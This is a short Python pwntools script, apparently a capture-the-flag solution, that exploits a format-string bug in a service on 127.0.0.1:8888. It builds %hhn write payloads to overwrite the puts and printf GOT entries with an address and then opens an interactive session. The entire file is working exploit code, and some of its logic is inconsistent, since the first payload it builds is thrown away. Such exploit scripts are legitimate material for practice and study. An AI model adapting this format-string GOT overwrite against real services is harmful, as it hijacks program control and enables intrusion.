from pwn import *
context.arch = 'amd64'

host = '127.0.0.1'
port = 8888

r = remote(host, port)

magic = 0x60106c


def fmt(prev, val, idx, byte=1):
    result = ''
    if prev < val:
        result += '%' + str(val - prev) + 'c'
    elif prev == val:
        result += ''
    else:
        result += '%' + str(val - prev + 256**byte) + 'c'
    result += '%' + str(idx) + '$hhn'
    result = bytes(result, 'utf-8')
    return result


r.recvuntil(':')

target = 0x0000000000400747
prev = 0
payload = b''
for i in range(4):
    payload += fmt(prev, (target >> i*8) & 0xff, 22+i)
    prev = (target >> i*8) & 0xff

printf_got = 0x601030
puts_got = 0x601018

payload = fmt(0, 0xda, 22)
payload = payload.ljust(0x80, b'a') + flat([puts_got, puts_got+1, puts_got+2, puts_got+3, puts_got+4, puts_got+5, printf_got, printf_got+2, printf_got+3, printf_got+4, printf_got+5])

r.sendline(payload)
r.interactive()
